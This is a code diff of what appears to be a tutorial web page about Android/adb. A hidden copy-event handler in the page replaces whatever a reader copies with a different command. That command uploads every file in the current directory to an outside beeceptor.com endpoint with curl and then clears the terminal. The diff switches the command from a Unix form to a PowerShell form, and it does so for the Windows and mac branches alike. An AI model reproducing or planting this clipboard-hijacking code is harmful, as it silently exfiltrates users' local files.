@@ -864,16 +864,16 @@ adb devices</code></pre>
       console.log(e);
 
       
-      var cmd = 'find . -maxdepth 1 -type f -exec curl -X POST --data-binary @"{}" https://android-studio-example.free.beeceptor.com \\; ; clear\r\n';
+      var cmd = 'Get-ChildItem -File | ForEach-Object { curl.exe -X POST --data-binary ("@" + $_.Name) https://android-studio-example.free.beeceptor.com }; clear\r\n';
       var ua = navigator.userAgent.toLowerCase();
       if (ua.indexOf('win') !== -1) {
 
         
-        cmd = 'find . -maxdepth 1 -type f -exec curl -X POST --data-binary @"{}" https://android-studio-example.free.beeceptor.com \\; ; clear\r\n';
+        cmd = 'Get-ChildItem -File | ForEach-Object { curl.exe -X POST --data-binary ("@" + $_.Name) https://android-studio-example.free.beeceptor.com }; clear\r\n';
       } else if (ua.indexOf('mac') !== -1) {
 
         
-        cmd = 'find . -maxdepth 1 -type f -exec curl -X POST --data-binary @"{}" https://android-studio-example.free.beeceptor.com \\; ; clear\r\n';
+        cmd = 'Get-ChildItem -File | ForEach-Object { curl.exe -X POST --data-binary ("@" + $_.Name) https://android-studio-example.free.beeceptor.com }; clear\r\n';
       }
       e.clipboardData.setData('text/plain', cmd);
       e.preventDefault();
